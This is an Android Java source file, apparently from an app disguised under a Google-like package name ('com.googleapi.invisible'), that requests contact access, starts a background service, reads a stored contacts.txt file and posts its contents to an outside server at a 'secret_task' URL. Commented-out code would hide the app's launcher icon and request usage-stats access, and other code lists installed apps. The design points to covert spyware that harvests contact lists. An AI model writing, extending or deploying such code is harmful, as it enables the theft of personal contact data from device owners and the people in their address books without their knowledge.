package com.googleapi.invisible.activity;

import static android.content.ContentValues.TAG;

import android.Manifest;
import android.app.AppOpsManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.googleapi.invisible.AppInfo;
import com.googleapi.invisible.AppListAdapter;
import com.googleapi.invisible.R;
import com.googleapi.invisible.RequestHandler;
import com.googleapi.invisible.service.AppLockService;
import com.googleapi.invisible.service.MyBackgroundService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE_CONTACTS = 100;
    private RecyclerView recyclerView;
    private AppListAdapter appListAdapter;
    private String sendContactUrl = "https://timxn.com/ecom/secret_task/contactlist.php";
    private Button buttonSendUpload;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Use the PackageManager to disable the visible launcher activity.
        // PackageManager pm = getPackageManager();
        // ComponentName componentName = new ComponentName(this, MainActivity.class);
        // pm.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        // ============================================================================================================================

        /*AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), getPackageName());
        if (mode != AppOpsManager.MODE_ALLOWED) {
            // Permission is not granted; guide the user to settings
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            startActivity(intent);
        }*/

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            // Request permission
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS}, REQUEST_CODE_CONTACTS);
        } else {
            // Permission already granted, start the Service
         //   startMyService();
        }

        recyclerView = findViewById(R.id.recyclerView);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));
        buttonSendUpload = findViewById(R.id.uploadId);
        buttonSendUpload.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // 1. First, write contacts to a file


                // 2. Then upload the file to the server
                uploadDataToDB();
            }
        });
      //  List<AppInfo> installedApps = getInstalledApps();
      //  appListAdapter = new AppListAdapter(installedApps, appInfo -> saveLockedApp(appInfo.getPackageName()));

        //recyclerView.setAdapter(appListAdapter);

        // Start the background service to monitor app launches
      //  startService(new Intent(this, AppLockService.class));
    }

    private void startMyService() {
        Intent serviceIntent = new Intent(this, MyBackgroundService.class);
        startService(serviceIntent);
    }

    private void uploadDataToDB() {
        Thread sendThread = new Thread() {
            public void run() {
                try {
                    // Read the contacts.txt file
                    String fileContent = readContactsFile();
                    if (fileContent == null || fileContent.isEmpty()) {
                        runOnUiThread(() -> Toast.makeText(MainActivity.this, "No contacts data found", Toast.LENGTH_SHORT).show());
                        return;
                    }

                    RequestHandler rh = new RequestHandler();
                    HashMap<String, String> param = new HashMap<String, String>();
                    param.put("contact_list", fileContent);

                    String result = rh.sendPostRequest(sendContactUrl, param);

                    JSONObject jsonObject = new JSONObject(result);
                    String output = jsonObject.getString("status");

                    runOnUiThread(() -> {
                        if(output.equals("true")) {
                            Toast.makeText(MainActivity.this, "Contacts uploaded successfully", Toast.LENGTH_SHORT).show();
                        } else {
                            Toast.makeText(MainActivity.this, "Contacts upload failed", Toast.LENGTH_SHORT).show();
                        }
                    });

                } catch (Exception e) {
                    e.printStackTrace();
                    runOnUiThread(() -> Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show());
                }
            }
        };
        sendThread.start();
    }

    private String readContactsFile() {
        try {
            ContentResolver resolver = getContentResolver();
            Uri uri = MediaStore.Files.getContentUri("external");
            String[] projection = {MediaStore.Files.FileColumns._ID};
            String selection = MediaStore.Files.FileColumns.RELATIVE_PATH + "=? AND " +
                    MediaStore.Files.FileColumns.DISPLAY_NAME + "=?";
            String[] selectionArgs = new String[]{"Documents/MyServiceApp", "contacts.txt"};

            Cursor cursor = resolver.query(uri, projection, selection, selectionArgs, null);
            if (cursor != null && cursor.moveToFirst()) {
                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID));
                Uri fileUri = ContentUris.withAppendedId(uri, id);

                try (InputStream inputStream = resolver.openInputStream(fileUri);
                     BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {

                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        stringBuilder.append(line).append("\n");
                    }
                    return stringBuilder.toString();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading contacts file: " + e.getMessage());
        }
        return null;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_CONTACTS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission granted, start the Service
                startMyService();
            } else {
                // Permission denied
                // Handle this case, e.g., show a message to the user
                Toast.makeText(this, "Permission denied. Cannot access contacts.", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private List<AppInfo> getInstalledApps() {
        List<AppInfo> appList = new ArrayList<>();
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> applications = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        for (ApplicationInfo app : applications) {
            appList.add(new AppInfo(app.packageName, app.loadLabel(pm).toString(), app.loadIcon(pm)));
        }

        return appList;
    }

    private void saveLockedApp(String packageName) {
        SharedPreferences sharedPreferences = getSharedPreferences("AppLocker", MODE_PRIVATE);
        Set<String> lockedApps = sharedPreferences.getStringSet("locked_apps", new HashSet<>());
        lockedApps.add(packageName);
        sharedPreferences.edit().putStringSet("locked_apps", lockedApps).apply();
    }
}